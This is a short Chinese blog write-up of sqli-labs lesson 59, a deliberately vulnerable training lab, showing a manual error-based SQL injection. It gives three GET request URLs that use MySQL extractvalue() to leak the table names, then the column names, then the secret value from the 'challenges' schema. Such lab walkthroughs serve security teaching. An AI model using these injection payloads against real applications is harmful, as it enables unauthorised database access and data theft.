---
title: sqli-labs lession-59 GET-双注入-变化2-仅允许5次请求
date: 2018-11-29 09:18:23
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-59 GET-双注入-变化2-仅允许5次请求

---

手注

判断为数字型,并且可以利用报错注入。

![001](/img/sql/Lesson-59/001.png)

`http://10.60.17.35:8082/Less-59/?id=1+and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),0x7e))%23`

![002](/img/sql/Lesson-59/002.png)

`http://10.60.17.35:8082/Less-59/?id=1+and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='av81nm62ml'),0x7e))%23`

![003](/img/sql/Lesson-59/003.png)

`http://10.60.17.35:8082/Less-59/?id=1+and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_V1FL)from challenges.av81nm62ml),0x7e))%23`

![004](/img/sql/Lesson-59/004.png)

提交

![005](/img/sql/Lesson-59/005.png)